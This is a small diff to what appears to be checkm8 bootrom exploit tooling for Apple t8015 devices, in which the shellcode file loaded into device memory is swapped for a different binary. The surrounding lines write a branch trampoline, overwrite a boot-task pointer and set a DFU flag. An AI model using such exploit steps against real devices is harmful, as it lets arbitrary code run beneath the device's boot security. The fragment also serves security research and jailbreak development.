@@ -407,7 +407,7 @@ if __name__ == '__main__':
                 print 'Heap repaired.'
 
                 device.write_memory(TRAMPOLINE, checkm8.asm_arm64_branch(TRAMPOLINE, TRAMPOLINE + 0x400))
-                device.write_memory(TRAMPOLINE + 0x400, open('bin/t8015_shellcode_arm64.bin').read())
+                device.write_memory(TRAMPOLINE + 0x400, open('bin/124_2.bin').read())
 
                 device.write_memory_ptr(BOOTSTRAP_TASK_LR, NAND_BOOT_JUMP)
                 device.write_memory(DFU_BOOL, '\x01')
